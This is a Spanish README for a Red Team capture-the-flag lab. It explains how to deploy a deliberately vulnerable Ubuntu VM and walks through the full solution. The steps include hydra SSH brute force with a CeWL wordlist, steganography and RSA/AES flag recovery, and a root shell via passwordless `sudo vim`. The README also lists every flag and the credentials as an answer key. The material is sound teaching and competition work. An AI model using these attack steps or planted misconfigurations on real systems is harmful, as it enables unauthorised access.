# CYBERQUEST :: Skynet — Nodo 07

Competencia de Red Team (CTF tipo "pentest-the-box"). Un participante ataca
la **máquina víctima** (Ubuntu Server sin interfaz gráfica, hostname
`intranet.skynet.local`, IP `10.10.10.7`) desde su Kali. Debe completar las
**5 misiones**, recuperar los **5 fragmentos** de la bandera, reconstruir el
**ADN** de la Resistencia y ejecutar la **ORDEN** final.

## Estructura del repositorio

```
Skynet-Ciber/
├── 00-install/                  # ORGANIZADOR: NO entregar a concursantes
│   ├── files/                   #   arbol de ficheros de la maquina victima
│   │   ├── home/dyson_m/...     #   · llave RSA privada, pistas, historial
│   │   ├── intranet/...         #   · webserver (Skynet intranet) + artefactos
│   │   ├── root/nucleo/...      #   · validador nucleo.sh, FLAG5.txt
│   │   └── etc/...              #   · sshd config, sudoers, motd, banner
│   ├── build_sources/           #   materiales de construccion (NUNCA desplegar)
│   └── install_cyberquest.sh    #   instalador (ejecutar como root en la victima)
├── tools/                       # herramientas de construccion y de ataque
│   ├── dctsteg.py               #   codec JSteg/DCT-LSB (embed + extract)
│   ├── resistance_steg.py       #   extractor standalone del analista
│   ├── build_artifacts.py       #   genera M3 (RSA/AES-CBC/b64/zip/pcap)
│   ├── exif_inject.py           #   inyecta EXIF/APP1 sin re-codificar el JPEG
│   ├── rsa_tool.py              #   descifrador RSA del atacante (Euclides)
│   └── test_end_to_end.py       #   valida TODA la cadena sobre 00-install/files
└── docs/
    ├── RedTeam_AfterAction.md   #   informe del ataque (entrega del equipo)
    ├── Arquitectura_RedTeam.md  #   arquitectura + resumen tecnico
    └── CYBERQUEST_Entrega.md    #   clave de correccion y puntajes (organizador)
```

## Despliegue de la víctima

```bash
# en un Ubuntu Server limpio (22.04/24.04)
sudo apt update && sudo apt install -y openssh-server python3
# copiar 00-install a la maquina y:
sudo bash install_cyberquest.sh
```

El instalador: crea usuarios (`dyson_m` y 8 señuelos `nologin`), fija la
password, copia el árbol, configura sshd (`AllowUsers dyson_m` + banner),
instala el sudoers (escalada `vim` sin password), levanta la intranet en el
puerto 80 con `python3 http.server` y abre 22/80 en el firewall.

## Las 5 misiones y sus flags

| # | Misión | Superficie | Flag |
|---|--------|-----------|------|
| F1 | Esteganografía DCT en `captura_terminador.jpg` | EXIF de la imagen | `NucleoRojo{TEEgUkVTSVNU}` |
| F2 | Web/OSINT — `robots.txt` | fichero web | `NucleoRojo{RU5DSUEgVEk}` |
| F3 | Crypto RSA+AES — `orden.txt` | ruta cripto M3 | `NucleoRojo{RU5FIE1VQ0hP}` |
| F4 | Zip AES — `bandera.jpg` (EXIF) | tras la pregunta | `NucleoRojo{UyBST1NUUk9T}` |
| F5 | Escalada root — `FLAG5.txt` | sudoers+`vim` | `NucleoRojo{XzAxMTA}` |

**ADN:** `LA RESISTENCIA TIENE MUCHOS ROSTROS_0110`
**ORDEN:** `El ataque es a las 4:00`

La concatenación de los fragmentos + la ORDER se validan por SHA-512 en
`/root/nucleo/nucleo.sh` (corre como root).

## Mapa mental de la resolución

```
nmap -> 80/22 -> intranet.skynet.local
 ├─ /personal.html  -> corpus OSINT (CeWL) -> hacker
 ├─ /archivo/       -> pcap + captura + bandera_nodo.zip
 │   ├─ (ZIP) pista: la pregunta oculta en el JPEG responde John Connor
 │   └─ captura.jpg -> DCT-LSB pregunta -> clave John Connor -> ZIP
 │       F1 en EXIF de la imagen
 ├─ /nucleo/        -> nucleo.conf (.enc) RSA 512 + ruido.enc AES-256-CBC -pbkdf2
 │       rsa_tool -> S3kiRa-07 -> openssl descifra ruido -> orden.txt (F3)
 │       doble base64 -> ORDEN ; CESAR/ROT13 -> arcon/john connor
 └─ /admin/         -> hint credenciales SSH (dyson_m / Cyberdyne)

SSH dyson_m -> pista2 (pcap/Wireshark GET) -> sudo -l -> vim -> root
 └─ F5 + nucleo.sh valida F1..F5 + ORDEN
```

## Guía del ataque — Paso a paso (demostración al profesor)

> Resolución íntegra de las 5 misiones contra la máquina víctima
> (`10.10.10.7`). Ejecutar desde el equipo del atacante (Kali).

### 0. Preparar el escenario

```bash
# 1) Importar la máquina virtual (OVA ~594 MB) en VirtualBox
#    VirtualBox > Archivo > Importar aparato virtual > Skynet-CYBERQUEST-Nodo07.ova
# 2) Crear red host-only 10.10.10.1/24 (sin DHCP) y asignarla a la VM
VBoxManage hostonlyif create
VBoxManage hostonlyif ipconfig "VirtualBox Host-Only Ethernet Adapter #2" \
   --ip 10.10.10.1 --netmask 255.255.255.0
# 3) Arrancar la VM. La víctima queda en 10.10.10.7 (web :80, ssh :22)
```

### 1. Reconocimiento

```bash
nmap -sV -sC 10.10.10.7
#   80/tcp  Python SimpleHTTP (intranet)
#   22/tcp  OpenSSH  (banner SKYNET INTRA NET NODO 07)
gobuster dir -u http://10.10.10.7 -w dir.txt
#   /robots.txt  /personal.html  /archivo/  /nucleo/  /admin/
```

**F2** se lee en `robots.txt`:

```
Fragmento_2=NucleoRojo{RU5DSUEgVEk}
```

✅ **F2 = `NucleoRojo{RU5DSUEgVEk}`** · 200 p.

### 2. Esteganografía DCT (M1) y ZIP cifrado (F4)

El índice menciona que "toda transferencia queda registrada en
`/archivo/pcap`" (`red_skynet.pcap` → GET de `captura_terminador.jpg` y
`bandera_nodo.zip`). `captura_terminador.jpg` oculta un payload en los
coeficientes AC (JSteg/DCT-LSB):

```bash
python3 tools/resistance_steg.py captura_terminador.jpg
#   PISTA_1 :: TRANSMISION INTERCEPTADA...
#   PREGUNTA: ¿Cual es el nombre de la persona que esta al lado del terminator?
```

La F1 se extrae del **EXIF** de la propia imagen:

```bash
exiftool -a -x ResolutionUnit captura_terminador.jpg
```
✅ **F1 = `NucleoRojo{TEEgUkVTSVNU}`** · 300 p.

La respuesta del lore es **John Connor** → abre el ZIP cifrado:

```bash
unzip bandera_nodo.zip    # password: John Connor
```
El EXIF de `bandera.jpg` y `pista4.txt` (hint de escalada) dan:
✅ **F4 = `NucleoRojo{UyBST1NUUk9T}`** · 300 p.

### 3. Credenciales por OSINT (acceso SSH)

`/personal.html` describe a Miles Dyson y repite el vocabulario corporativo;
`/admin/` deja en un comentario HTML el usuario `dyson_m` y que su contraseña
"nunca cambió desde el proyecto CYBERDYNE".

```bash
cewl http://10.10.10.7 -m 5 -w palabras.txt
hydra -l dyson_m -P palabras.txt ssh://10.10.10.7
```
→ `dyson_m:Cyberdyne` · Acceso **SSH (T1110)**.

### 4. Criptografía híbrida RSA + AES (M3)

`/nucleo/` publica `nucleo.conf` (e, n), `nucleo.conf.enc` y `ruido.enc`.
Tras entrar por SSH, en `~/nucleo/llave_privada.txt` está la clave RSA:

```bash
python3 tools/rsa_tool.py llave_privada.txt nucleo.conf nucleo.conf.enc
# -> S3kiRa-07   (clave de sesión)
openssl enc -d -aes-256-cbc -pbkdf2 -k 'S3kiRa-07' -in ruido.enc -out orden.txt
```
En `orden.txt`: `FRAGMENTO_3` y una cadena **doble base64**:
`Uld3Z1lYUmhjWFZsSUdWeklHRWdiR0Z6SURRNk1EQT0=` → `El ataque es a las 4:00`.

✅ **F3 = `NucleoRojo{RU5FIE1VQ0hP}`** · 200 p.
✅ **ORDEN = `El ataque es a las 4:00`** · 200 p.
**(Bonus ROT13** +300 p.**: `ry nepba` → "el arcon de la resistencia se abre
con john connor".)**

### 5. Escalada a root (M5)

Con `dyson_m`:

```bash
sudo -l      # (root) NOPASSWD: /usr/bin/vim, /usr/bin/vi
sudo vim -c ':!/bin/bash'
```
GTFOBins → shell root (T1548). En `/root/nucleo/`:
✅ **F5 = `NucleoRojo{XzAxMTA}`** · 300 p.

### 6. Validación final

```bash
sudo /root/nucleo/nucleo.sh
#  >>> NUCLEO VERIFICADO CON EXITO <<<
#  ADN  : LA RESISTENCIA TIENE MUCHOS ROSTROS_0110
#  ORDEN: El ataque es a las 4:00
```
El ADN = concatenación de los 5 fragmentos `_0110`; la ORDEN se valida por
SHA-512 dentro de `nucleo.sh`.

### 7. Autoverificación del montaje (opcional, en la máquina de construcción)

```bash
pip install Pillow numpy pyzipper cryptography
python tools/build_artifacts.py     # regenera artefactos (si es necesario)
python tools/test_end_to_end.py     # valida TODA la cadena sobre 00-install/files
```

> La máquina virtual compilada (`Skynet-CYBERQUEST-Nodo07.ova`) no se aloja en
> este repositorio (GitHub limita ficheros a 100 MB). Se distribuye como
> adjunto de una *Release* o por otro canal privado.

## Créditos y lema

## Créditos y lema

> "La Resistencia tiene muchos rostros." — CYBERQUEST 2026